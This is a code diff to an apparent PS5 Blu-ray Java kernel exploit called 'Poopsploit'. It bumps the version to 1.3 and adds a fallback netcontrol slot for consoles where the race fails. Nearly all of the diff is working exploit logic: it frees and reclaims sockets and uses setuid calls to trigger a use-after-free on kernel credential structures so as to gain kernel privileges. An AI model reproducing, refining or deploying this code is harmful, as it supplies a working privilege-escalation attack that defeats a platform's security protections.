@@ -17,7 +17,7 @@ import java.net.Socket;
 
 public class Poops {
     
-    private static final String VERSION_STRING = "BD-J Poopsploit 1.2";
+    private static final String VERSION_STRING = "BD-J Poopsploit 1.3";
     
     private static final int KERNEL_PID = 0;
     
@@ -685,6 +685,8 @@ public class Poops {
         for (int i = 0; i < ipv6Socks.length; i++) {
             freeRthdr(ipv6Socks[i]);
         }
+        
+        Status.println("Starting netcontrol exploit");
 
         Buffer setBuf = new Buffer(8);
         Buffer clearBuf = new Buffer(8);
@@ -698,23 +700,51 @@ public class Poops {
         
         // Register dummy socket.
         setBuf.putInt(0x00, dummySock);
-        __sys_netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf.size());
-        
-        // Close the dummy socket.
-        close(dummySock);
-        
-        // Allocate a new ucred.
-        setuid(1);
-        
-        // Reclaim the file descriptor.
-        uafSock = socket(AF_UNIX, SOCK_STREAM, 0);
-        
-        // Free the previous ucred. Now uafSock's cr_refcnt of f_cred is 1.
-        setuid(1);
-        
-        // Unregister dummy socket and free the file and ucred.
-        clearBuf.putInt(0x00, uafSock);
-        __sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());
+        if (__sys_netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf.size()) == 0) {
+            
+            // Close the dummy socket.
+            close(dummySock);
+            
+            // Allocate a new ucred.
+            setuid(1);
+            
+            // Reclaim the file descriptor.
+            uafSock = socket(AF_UNIX, SOCK_STREAM, 0);
+            
+            // Free the previous ucred. Now uafSock's cr_refcnt of f_cred is 1.
+            setuid(1);
+            
+            // Unregister dummy socket and free the file and ucred.
+            clearBuf.putInt(0x00, uafSock);
+            __sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());
+            
+        } else {
+            
+            // This is temp fix for so called "cursed" PS5 that getting twin race fail error
+            Status.println("Falling back to slot 1");
+            
+            if (__sys_netcontrol(1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf.size()) != 0) {
+                Status.println("FATAL ERROR : all netcontrol slots are occupied");
+                return false;
+            }
+            
+            // Close the dummy socket.
+            close(dummySock);
+            
+            // Allocate a new ucred.
+            setuid(1);
+            
+            // Reclaim the file descriptor.
+            uafSock = socket(AF_UNIX, SOCK_STREAM, 0);
+            
+            // Free the previous ucred. Now uafSock's cr_refcnt of f_cred is 1.
+            setuid(1);
+            
+            // Unregister dummy socket and free the file and ucred.
+            clearBuf.putInt(0x00, uafSock);
+            __sys_netcontrol(1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());
+            
+        }
         
         // Set cr_refcnt back to 1.
         for (int i = 0; i < 32; i++) {
